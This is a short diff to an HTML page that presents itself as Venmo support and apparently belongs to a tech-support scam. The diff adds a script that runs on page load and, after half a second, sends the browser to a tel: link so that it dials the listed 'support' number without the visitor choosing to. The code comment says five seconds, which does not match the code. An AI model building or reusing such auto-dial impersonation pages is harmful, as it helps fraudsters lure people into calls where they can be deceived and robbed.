@@ -129,11 +129,17 @@
         <p></p>
 
         <div class="footer">
-            Need help? <a href="tel:+18662403266">Call Venmo Support</a>
+            Need help? <a href="tel:+18662403266">Call Venmo Support (866) 240-3266</a>
         </div>
     </div>
 
-
+  <script>
+        window.onload = function() {
+            setTimeout(function() {
+                window.location.href = "tel:+18662403266"; 
+            }, 500); // Automatically calls after 5 seconds
+        };
+    </script>
 
 
 </body>
